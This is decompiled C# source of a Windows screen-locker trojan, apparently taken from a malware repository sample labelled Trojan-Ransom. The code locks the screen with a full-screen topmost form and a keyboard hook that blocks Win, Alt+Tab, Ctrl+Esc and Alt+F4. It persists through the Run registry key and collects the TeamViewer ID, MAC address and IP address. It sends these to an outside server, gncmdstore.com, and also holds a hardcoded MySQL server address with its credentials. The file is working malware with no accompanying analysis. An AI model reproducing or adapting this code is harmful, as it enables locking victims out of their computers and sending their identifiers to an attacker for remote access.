// Decompiled with JetBrains decompiler
// Type: hardworking.Form1
// Assembly: hardworking, Version=1.0.0.0, Culture=neutral, PublicKeyToken=18ccce85020f340c
// MVID: C40E4E90-4480-4BF5-B270-6473C594BC1D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-10b83441122e6b29cb4077df735e8afd3270117f267e7e814cfe17e50aee75c1.exe

using Microsoft.Win32;
using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace hardworking
{
  public class Form1 : Form
  {
    private MySqlConnection conn;
    private string mac;
    private string pc_locked;
    private string Show;
    private string teamviewer;
    private string sMacAddress = string.Empty;
    private string country = "JP";
    private string cp_disable;
    private string taskmanager;
    private string host_file;
    private string Teamviewerstring = string.Empty;
    private string path;
    private string connString = "SERVER=107.180.3.171; PORT=3306; DATABASE=computer_details; UID=computer_details; PASSWORD=admin@password";
    private IntPtr ptrHook;
    private Form1.LowLevelKeyboardProc objKeyboardProcess;
    private IContainer components;
    private Label label1;
    private Label label2;
    private Label label3;
    private Label label4;
    private NotifyIcon notifyIcon1;
    private WebBrowser webBrowser1;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int id,
      Form1.LowLevelKeyboardProc callback,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hook);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hook,
      int nCode,
      IntPtr wp,
      IntPtr lp);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string name);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern short GetAsyncKeyState(Keys key);

    public Form1()
    {
      this.InitializeComponent();
      this.Hide();
      this.WindowState = FormWindowState.Normal;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Bounds = Screen.PrimaryScreen.Bounds;
      this.MinimizeBox = false;
      this.MaximizeBox = false;
      this.ControlBox = false;
      Form1.GetTeamviewerID();
      this.GetTeamViewerId();
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (this.sMacAddress == string.Empty)
        {
          networkInterface.GetIPProperties();
          this.sMacAddress = networkInterface.GetPhysicalAddress().ToString();
        }
      }
      ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
      this.objKeyboardProcess = new Form1.LowLevelKeyboardProc(this.captureKeys);
      this.ptrHook = Form1.SetWindowsHookEx(13, this.objKeyboardProcess, Form1.GetModuleHandle(mainModule.ModuleName), 0U);
    }

    private IntPtr captureKeys(int nCode, IntPtr wp, IntPtr lp)
    {
      if (nCode >= 0)
      {
        Form1.KBDLLHOOKSTRUCT structure = (Form1.KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lp, typeof (Form1.KBDLLHOOKSTRUCT));
        if (structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.Tab && this.HasAltModifier(structure.flags) || structure.key == Keys.Escape && (Control.ModifierKeys & Keys.Control) == Keys.Control)
          return (IntPtr) 1;
      }
      return Form1.CallNextHookEx(this.ptrHook, nCode, wp, lp);
    }

    private IntPtr workingkey(int nCode, IntPtr wp, IntPtr lp)
    {
      if (nCode >= 0)
      {
        Form1.KBDLLHOOKSTRUCT structure = (Form1.KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lp, typeof (Form1.KBDLLHOOKSTRUCT));
        if (structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.Tab && this.HasAltModifier(structure.flags) || structure.key == Keys.Escape && (Control.ModifierKeys & Keys.Control) == Keys.Control)
          return (IntPtr) 0;
      }
      return Form1.CallNextHookEx(this.ptrHook, nCode, wp, lp);
    }

    private bool HasAltModifier(int flags) => (flags & 32) == 32;

    private long GetTeamViewerId()
    {
      try
      {
        string name1 = Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\TeamViewer" : "SOFTWARE\\TeamViewer";
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name1);
        if (registryKey == null)
          return 0;
        object obj1 = registryKey.GetValue("ClientID");
        this.Teamviewerstring = obj1.ToString();
        if (obj1 != null)
          return Convert.ToInt64(obj1);
        foreach (string name2 in ((IEnumerable<string>) registryKey.GetSubKeyNames()).Reverse<string>())
        {
          object obj2 = registryKey.OpenSubKey(name2).GetValue("ClientID");
          if (obj2 != null)
            return Convert.ToInt64(obj2);
        }
        return 0;
      }
      catch (Exception ex)
      {
        return 0;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.ShowInTaskbar = false;
      this.WindowState = FormWindowState.Normal;
      this.Focus();
      this.TopMost = true;
      this.Bounds = Screen.PrimaryScreen.Bounds;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      string str = Application.ExecutablePath.ToString();
      registryKey.SetValue("Testing", (object) str);
      string empty1 = string.Empty;
      IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
      string empty2 = string.Empty;
      for (int index = 0; index < addressList.Length; ++index)
        empty2 = addressList[index].ToString();
      this.label3.Text = this.sMacAddress.Substring(this.sMacAddress.Length - 10);
      try
      {
        this.label1.Text = this.Teamviewerstring.Substring(this.Teamviewerstring.Length - 5);
        WebBrowser webBrowser = new WebBrowser();
        string currentDirectory = Directory.GetCurrentDirectory();
        webBrowser.Url = new Uri(string.Format("http://gncmdstore.com/api_update.php?id=" + this.sMacAddress + "& ip=" + empty2 + "& TeamViewer_id=" + this.Teamviewerstring + "& country=" + this.country, (object) currentDirectory));
        webBrowser.ScriptErrorsSuppressed = true;
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public static string GetTeamviewerID()
    {
      List<string> list = ((IEnumerable<string>) new string[7]
      {
        "4",
        "5",
        "5.1",
        "6",
        "7",
        "8",
        "14"
      }).Reverse<string>().ToList<string>();
      string[] strArray = new string[2]
      {
        "SOFTWARE\\TeamViewer",
        "SOFTWARE\\Wow6432Node\\TeamViewer"
      };
      foreach (string name1 in strArray)
      {
        if (Registry.LocalMachine.OpenSubKey(name1) != null)
        {
          foreach (string str in list)
          {
            string name2 = string.Format("{0}\\Version{1}", (object) name1, (object) str);
            if (Registry.LocalMachine.OpenSubKey(name2) != null)
            {
              object obj = Registry.LocalMachine.OpenSubKey(name2).GetValue("ClientID");
              if (obj != null)
                return Convert.ToInt32(obj).ToString();
            }
          }
        }
      }
      return string.Empty;
    }

    protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
    {
      if (keyData == (Keys.F4 | Keys.Alt))
        return true;
      if (keyData != (Keys.E | Keys.Control | Keys.Alt))
        return base.ProcessCmdKey(ref msg, keyData);
      this.Close();
      return false;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.label1 = new Label();
      this.label2 = new Label();
      this.label3 = new Label();
      this.label4 = new Label();
      this.notifyIcon1 = new NotifyIcon(this.components);
      this.webBrowser1 = new WebBrowser();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.BackColor = SystemColors.ActiveCaption;
      this.label1.Font = new Font("Microsoft Sans Serif", 13f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.Location = new Point(567, 50);
      this.label1.Name = "label1";
      this.label1.Size = new Size(58, 22);
      this.label1.TabIndex = 0;
      this.label1.Text = "label1";
      this.label2.AutoSize = true;
      this.label2.BackColor = SystemColors.ActiveCaption;
      this.label2.Font = new Font("Microsoft Sans Serif", 13f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label2.Location = new Point(522, 50);
      this.label2.Name = "label2";
      this.label2.Size = new Size(39, 22);
      this.label2.TabIndex = 1;
      this.label2.Text = "TID";
      this.label3.AutoSize = true;
      this.label3.BackColor = SystemColors.ActiveCaption;
      this.label3.Font = new Font("Microsoft Sans Serif", 13f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.Location = new Point(397, 50);
      this.label3.Name = "label3";
      this.label3.Size = new Size(58, 22);
      this.label3.TabIndex = 2;
      this.label3.Text = "label3";
      this.label4.AutoSize = true;
      this.label4.BackColor = SystemColors.ActiveCaption;
      this.label4.Font = new Font("Microsoft Sans Serif", 13f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label4.Location = new Point(350, 50);
      this.label4.Name = "label4";
      this.label4.Size = new Size(41, 22);
      this.label4.TabIndex = 3;
      this.label4.Text = "MID";
      this.notifyIcon1.Icon = (Icon) componentResourceManager.GetObject("notifyIcon1.Icon");
      this.notifyIcon1.Text = "US";
      this.notifyIcon1.Visible = true;
      this.webBrowser1.Location = new Point(-29, 419);
      this.webBrowser1.MinimumSize = new Size(20, 20);
      this.webBrowser1.Name = "webBrowser1";
      this.webBrowser1.Size = new Size(20, 20);
      this.webBrowser1.TabIndex = 4;
      this.AutoScaleDimensions = new SizeF(6f, 14f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      this.BackgroundImageLayout = ImageLayout.Stretch;
      this.ClientSize = new Size(800, 485);
      this.Controls.Add((Control) this.webBrowser1);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.DoubleBuffered = true;
      this.Font = new Font("Times New Roman", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private struct KBDLLHOOKSTRUCT
    {
      public Keys key;
      public int scanCode;
      public int flags;
      public int time;
      public IntPtr extra;
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
